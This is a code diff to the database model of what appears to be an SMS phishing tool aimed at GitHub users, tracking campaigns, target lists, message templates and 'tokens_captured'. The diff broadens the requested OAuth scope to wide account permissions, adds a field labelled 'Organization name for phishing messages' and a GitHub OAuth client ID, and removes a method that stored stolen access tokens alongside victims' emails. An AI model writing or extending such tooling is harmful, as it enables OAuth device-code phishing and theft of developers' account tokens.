@@ -22,7 +22,6 @@ class SMSCampaign(Base):
     
     # Campaign metadata
     name = Column(String, nullable=False)
-    platform = Column(String, nullable=False, default='github')
     provider = Column(String, nullable=False)  # 'twilio' or 'aws'
     
     # Campaign configuration
@@ -30,7 +29,9 @@ class SMSCampaign(Base):
     target_method = Column(String, nullable=False)  # 'single' or 'file'
     targets = Column(JSON)  # List of target emails/phones
     message_template = Column(Text)
-    oauth_scope = Column(String, default='repo user')
+    oauth_scope = Column(String, default='repo user gist notifications workflow read:org read:public_key read:repo_hook read:user read:discussion')
+    client_id = Column(String, nullable=True)  # GitHub OAuth app client ID
+    org_name = Column(String, nullable=True)  # Organization name for phishing messages
     
     # Campaign state
     status = Column(String, default='pending')  # pending, running, completed, failed, stopped
@@ -41,15 +42,12 @@ class SMSCampaign(Base):
     # Campaign statistics
     sms_sent = Column(Integer, default=0)
     tokens_captured = Column(Integer, default=0)
-    
-    # Campaign logs and results
+
+    # Campaign logs
     logs = Column(Text, default='')
-    captured_tokens = Column(JSON, default=list)
-    
+
     # Optional settings
-    encryption_key = Column(String, nullable=True)
-    proxy_url = Column(String, nullable=True)
-    debug_mode = Column(Boolean, default=False)
+    skip_wait = Column(Boolean, default=False)  # Skip OAuth token polling
     
     def __init__(self, **kwargs):
         super().__init__(**kwargs)
@@ -61,7 +59,6 @@ class SMSCampaign(Base):
         return {
             'id': self.id,
             'name': self.name,
-            'platform': self.platform,
             'provider': self.provider,
             'target_method': self.target_method,
             'target_count': len(self.targets) if self.targets else 0,
@@ -70,8 +67,7 @@ class SMSCampaign(Base):
             'created': self.created_at.isoformat() if self.created_at else None,
             'completed': self.completed_at.isoformat() if self.completed_at else None,
             'sms_sent': self.sms_sent,
-            'tokens_captured': self.tokens_captured,
-            'debug_mode': self.debug_mode
+            'tokens_captured': self.tokens_captured
         }
     
     def add_log(self, message: str):
@@ -82,29 +78,22 @@ class SMSCampaign(Base):
             self.logs += log_entry
         else:
             self.logs = log_entry
-    
-    def add_captured_token(self, email: str, access_token: str, user_code: str = None):
-        """Add a captured token to the campaign."""
-        if not self.captured_tokens:
-            self.captured_tokens = []
-        
-        token_data = {
-            'email': email,
-            'access_token': access_token,
-            'user_code': user_code,
-            'captured_at': datetime.now(timezone.utc).timestamp()
-        }
-        
-        self.captured_tokens.append(token_data)
-        self.tokens_captured = len(self.captured_tokens)
-    
+
     def get_runtime(self) -> str:
         """Get human-readable runtime duration."""
         if not self.started_at:
             return '0s'
-        
+
         end_time = self.completed_at or datetime.now(timezone.utc)
-        duration = end_time - self.started_at
+
+        # Ensure both datetimes are timezone-aware for comparison
+        start_time = self.started_at
+        if start_time.tzinfo is None:
+            start_time = start_time.replace(tzinfo=timezone.utc)
+        if end_time.tzinfo is None:
+            end_time = end_time.replace(tzinfo=timezone.utc)
+
+        duration = end_time - start_time
         
         total_seconds = int(duration.total_seconds())
         hours = total_seconds // 3600
